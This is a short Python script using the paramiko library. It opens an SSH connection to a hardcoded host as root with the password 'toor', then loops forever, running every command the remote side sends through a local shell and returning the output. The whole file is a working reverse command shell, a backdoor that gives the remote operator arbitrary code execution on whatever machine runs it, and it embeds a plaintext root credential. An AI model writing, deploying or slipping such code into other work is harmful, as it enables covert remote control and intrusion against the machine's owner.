#!/usr/bin/python

import sys
import threading
import paramiko
import subprocess

def ssh_command(ip,uname,upass,cmd):
   

    client = paramiko.SSHClient()

    # 密钥认证
    #client.load_host_keys()
    # 用户名、密码认证
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=ip, username=uname, password=upass)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(cmd)
        data = ssh_session.recv(1024)
        print(data.decode('utf-8'))

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except Exception:
                pass
        client.close()
    return

ssh_command("192.168.0.102","root","toor","ClientConnected")